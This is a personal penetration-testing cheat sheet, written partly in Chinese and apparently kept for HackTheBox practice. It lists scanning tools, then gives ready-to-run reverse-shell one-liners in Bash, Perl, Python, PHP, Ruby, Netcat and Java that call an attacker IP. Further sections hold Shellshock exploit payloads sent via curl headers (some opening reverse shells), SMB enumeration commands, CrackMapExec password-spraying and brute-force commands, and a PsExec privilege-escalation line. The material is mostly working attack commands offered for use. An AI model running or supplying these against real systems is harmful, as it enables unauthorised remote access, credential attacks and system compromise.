>Here's where I drop whatever comes to my mind

### 掃描目錄
+ [dirsearch](https://github.com/maurosoria/dirsearch)
+ [gobuster](https://github.com/OJ/gobuster)
+ [dirb](https://github.com/v0re/dirb)
+ [ffuf](https://github.com/ffuf/ffuf)
+ [feroxbuster](https://github.com/epi052/feroxbuster)
>feroxbuster -u HTBIP -x php,html -f -n 

### 網路掃描工具
+ [nmap](https://nmap.org/)
>nmap -sV -sC -A -T4 HTBIP
+ [RustScan](https://github.com/RustScan/RustScan)
+ [pnscan](https://github.com/ptrrkssn/pnscan)

### [Reverse Shell Cheat Sheet](https://pentestmonkey.net/)
+ Bash
`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

+ [PERL](https://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
` perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' `

+ Python
` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' `

+ [PHP](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
` php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");' `

+ Ruby
` ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' `

+ [Netcat](https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498)
` nc -e /bin/sh 10.0.0.1 1234 `
>即使它有多個版本的 netcat，但其中一些不支持 -e 選項。
>如果你安裝了錯誤版本的 netcat，仍然可以像這樣恢復你的反向 shell：
` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f `

+ Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

+ Perl 
`perl -e 'use Socket;$i="[AttackerIP]";$p=[AttackerPort];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

+ PHP 
`php -r '$sock=fsockopen("[attackerIP]",[attackerPort]);exec("/bin/sh -i <&3 >&3 2>&3");'`


### 攻擊技巧
+ [CGI-bin exploit](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)

```
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'

# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi

# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh

# Reverse shell using curl 
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi

```

+ [Nmap Scripting Engine (NSE)](https://nmap.org/book/nse.html)

```
#列出可用腳本
locate nse

#使用默認腳本集的簡單腳本掃描。
nmap -sC example.com

#沒有端口掃描的腳本掃描；只有主機腳本才有資格運行。
nmap -sn -sC example.com

#沒有主機發現或端口掃描的腳本掃描。假定所有主機都已啟動，並且只有主機腳本才有資格運行。
nmap -Pn -sn -sC example.com

#使用腳本跟踪執行特定腳本
nmap --script smb-os-discovery --script-trace example.com

#運行帶有腳本參數的單個腳本。
nmap --script snmp-sysdescr --script-args creds.snmp=admin example.com

#執行 mycustomscripts目錄中的所有腳本以及safe類別中的所有腳本。
nmap --script mycustomscripts,safe example.com

```

+ ShellShock==Bashdoor 

```
# Bashdoor POC
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

# namp NSE ShellShock
nmap -sV -p- --script http-shellshock <target>
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>

# burpsuit can testing, need to replace User-Agent content attempt vulnerability
User-Agent: () { :;}; echo; /usr/bin/id
User-Agent: () { :;}; echo; /bin/ping -c 1 10.129.108.18
User-Agent: () { :;}; /usr/bin/python3 -c 'import os;os.system("echo; /bin/ping -c 2 10.10.14.15")'; /bin/ping -c 1 10.10.14.15
User-Agent: () { :;}; echo; /usr/bin/python3 -c 'import os; os.system("/bin/ping -c 1 10.10.14.15")'; /usr/bin/id
```

### Spawning a TTY Shell

```
- python -c 'import pty; pty.spawn("/bin/sh")'
- echo os.system('/bin/bash')
- /bin/sh -i
- perl —e 'exec "/bin/sh";'
- perl: exec "/bin/sh";
- ruby: exec "/bin/sh"
- lua: os.execute('/bin/sh')
- exec "/bin/sh"
```

### SMB
[smbclient](https://oldgrayduck.blogspot.com/2021/06/centos7-smbclient-windows.html?m=0)

```
smb  -L //IP/dir name  -U useraccount
smbclient -L //<attackerIP>/<folder> --option='client min protocol=NT1'

nmap --script smb-vuln* -p port IP

#Download all
smbclient //<IP>/<share>

```
smbmap
`smbmap -u admin -p password1 -d workgroup -H IP`

enum4linux

```
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>
```

### [NetBIOS](https://www.kali.org/tools/nbtscan/)
nbtscan 

### WhoPort
+ 139,445 => SMB


### 後滲透利用工具
[CrackMapExec](https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/)
```
# Target format
crackmapexec smb ms.evilcorp.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb 192.168.10.1 -u "" up ""

# Bruteforcing and Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt

```

### 提權
PsExec
`psexec.exe -s -i cmd.exe`
